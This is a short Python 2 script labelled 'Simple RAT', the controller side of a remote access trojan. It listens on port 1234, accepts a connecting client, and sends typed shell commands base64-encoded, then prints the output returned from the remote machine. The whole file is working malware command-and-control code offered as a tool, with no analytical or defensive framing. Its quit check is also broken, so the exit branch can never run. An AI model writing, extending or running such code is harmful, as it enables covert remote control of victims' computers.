#!/usr/bin/env python
#__*__ coding:utf-8__*__

import socket
import sys

BLUE, YELLOW, GREEN, RED, END = '\033[1;34m', '\033[1;33m', '\033[1;32m', '\033[1;31m', '\033[0m'
BANNER = '''
+---------------------------------------+
|  Author : Pierre                      |
|  Description : Simple RAT             |
|                                       |
+---------------------------------------+
'''

server = ''
port = 1234

def main():
    print BLUE + BANNER + END
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server, port))
    s.listen(10)
    print YELLOW + '[+] Server is listening on port {} ...'.format(port) + END
    client, addr = s.accept()
    print YELLOW + '[+] Connection accepted from client {}:{}'.format(addr[0], addr[1]) + END
    while True:
        try:
            cmd = raw_input(BLUE + '$> ' + END)
        except KeyboardInterrupt:
            print RED + '[-] Error : User keyboard interrupt' + END
            s.close()
            sys.exit(1)
        if cmd != 'quit' or cmd != 'exit':
            client.send(cmd.encode('base64', 'strict'))
            res = client.recv(2048)
            total_size = long(res[:16].decode('base64', 'strict'))
            res = res[16:]
            while total_size > len(res):
                data = client.recv(2048)
                res += data
            print res.decode('base64', 'strict')

        else:
            client.send(u"exit")
            print YELLOW + 'Shutting down the connection to the client...' + END
            break

if __name__ == '__main__':
    main()
